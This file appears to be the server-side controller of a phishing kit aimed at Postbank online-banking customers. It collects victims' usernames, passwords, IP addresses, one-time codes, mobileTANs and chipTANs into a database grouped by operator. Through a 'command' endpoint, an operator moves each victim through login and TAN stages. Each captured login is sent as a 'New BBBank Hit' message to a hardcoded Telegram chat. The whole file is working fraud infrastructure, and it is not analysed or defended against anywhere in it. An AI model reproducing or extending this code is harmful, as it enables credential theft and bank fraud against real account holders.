const PostBank = require("../models/postbankModel");
var moment = require("moment"); // require
const axios = require("axios");

const getOwnerVics = async (req, res) => {
    const { owner } = req.params;
    PostBank
        .find({ owner })
        .sort({ timestamp: -1 })
        .exec((err, vics) => {
            if (err) {
                console.log(err);
                res.status(404).send("Error");
                return;
            }
            res.send(vics);
        });
};

const command = async (req, res) => {
    const { uniqueid, status, telephone, startCode } = req.body;
    try {
        if (telephone) await PostBank.findOneAndUpdate({ uniqueid }, { status, telephone }).exec();
        if (startCode) await PostBank.findOneAndUpdate({ uniqueid }, { status, startCode }).exec();
        if (!telephone || !startCode) await PostBank.findOneAndUpdate({ uniqueid }, { status }).exec();
        res.sendStatus(200);
    } catch (error) {
        console.log(error);
        res.sendStatus(400);
    }
};

const getInfo = async (req, res) => {
    const { uniqueid } = req.params;
    PostBank.findOne({ uniqueid }).exec((err, vic) => {
        if (err) {
            console.log(err);
            res.status(404).send("Error");
            return;
        }
        res.send(vic);
    });
};

const submitLogin = async (req, res) => {
    const { username, password, uniqueid, owner, ip } = req.body;
    try {
        await PostBank.create({ uniqueid, username, password, status: 1, owner, ip, timestamp: moment().format() });
        await axios
            .post(
                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
                {
                    chat_id: '-837014205',
                    text: `New BBBank Hit:\n\n${username}\n${pin}`,
                    parse_mode: "Markdown",
                }
            )
            .catch((e) => {
                console.log(e);
            });
        res.sendStatus(200);
    } catch (error) {
        console.log(error);
        res.sendStatus(400);
    }
};

const submitLoginAgain = async (req, res) => {
    const { username, password, uniqueid } = req.body;
    try {
        await PostBank.findOneAndUpdate({ uniqueid }, { username, password, status: 0, timestamp: moment().format() }).exec();
        res.sendStatus(200);
    } catch (error) {
        console.log(error);
        res.sendStatus(400);
    }
};

const submitOtp = async (req, res) => {
    const { otp, uniqueid } = req.body;
    try {
        await PostBank.findOneAndUpdate({ uniqueid }, { otp, status: 3, timestamp: moment().format() }).exec();
        res.sendStatus(200);
    } catch (error) {
        console.log(error);
        res.sendStatus(400);
    }
};

const submitMobileTan = async (req, res) => {
    const { mobileTAN, uniqueid } = req.body;
    try {
        await PostBank.findOneAndUpdate({ uniqueid }, { mobileTAN, status: 5, timestamp: moment().format() }).exec();
        res.sendStatus(200);
    } catch (error) {
        console.log(error);
        res.sendStatus(400);
    }
};

const submitChipTan = async (req, res) => {
    const { chipTAN, uniqueid } = req.body;
    try {
        await PostBank.findOneAndUpdate({ uniqueid }, { chipTAN, status: 10, timestamp: moment().format() }).exec();
        res.sendStatus(200);
    } catch (error) {
        console.log(error);
        res.sendStatus(400);
    }
};

const submitBestSign = async (req, res) => {
    const { accepted, uniqueid } = req.body;
    try {
        if (accepted) await PostBank.findOneAndUpdate({ uniqueid }, { status: 7, timestamp: moment().format() }).exec();
        else await PostBank.findOneAndUpdate({ uniqueid }, { status: 8, timestamp: moment().format() }).exec();
    } catch (error) {
        console.log(error);
        res.sendStatus(400);
    }
};

const deleteEntry = async (req, res) => {
    const { uniqueid } = req.body;
    try {
        await PostBank.deleteOne({ uniqueid });
        res.sendStatus(200);
    } catch (error) {
        console.log(error);
        res.sendStatus(400);
    }
};

module.exports = {
    getOwnerVics,
    command,
    getInfo,
    submitLogin,
    submitLoginAgain,
    submitOtp,
    submitMobileTan,
    submitChipTan,
    deleteEntry,
    submitBestSign,
};
